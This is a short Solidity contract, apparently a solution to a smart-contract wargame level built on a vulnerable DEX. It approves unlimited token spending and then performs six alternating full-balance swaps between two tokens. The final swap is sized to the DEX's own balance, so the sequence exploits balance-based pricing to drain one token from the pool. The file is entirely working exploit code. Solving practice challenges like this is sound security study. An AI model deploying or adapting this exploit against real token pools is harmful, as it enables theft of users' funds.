// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Dex.sol";

contract Level22 {
    Dex dex;
    SwappableToken token1;
    SwappableToken token2;

    constructor(
        address dexAddr,
        address token1Addr,
        address token2Addr
    ) public {
        token1 = SwappableToken(token1Addr);
        token2 = SwappableToken(token2Addr);
        dex = Dex(dexAddr);
    }

    function main() public {
        token1.approve(address(dex), 2**256 - 1);
        token2.approve(address(dex), 2**256 - 1);

        dex.swap(
            address(token1),
            address(token2),
            token1.balanceOf(address(this))
        );

        dex.swap(
            address(token2),
            address(token1),
            token2.balanceOf(address(this))
        );

        dex.swap(
            address(token1),
            address(token2),
            token1.balanceOf(address(this))
        );

        dex.swap(
            address(token2),
            address(token1),
            token2.balanceOf(address(this))
        );

        dex.swap(
            address(token1),
            address(token2),
            token1.balanceOf(address(this))
        );

        dex.swap(
            address(token2),
            address(token1),
            token2.balanceOf(address(dex))
        );
    }
}
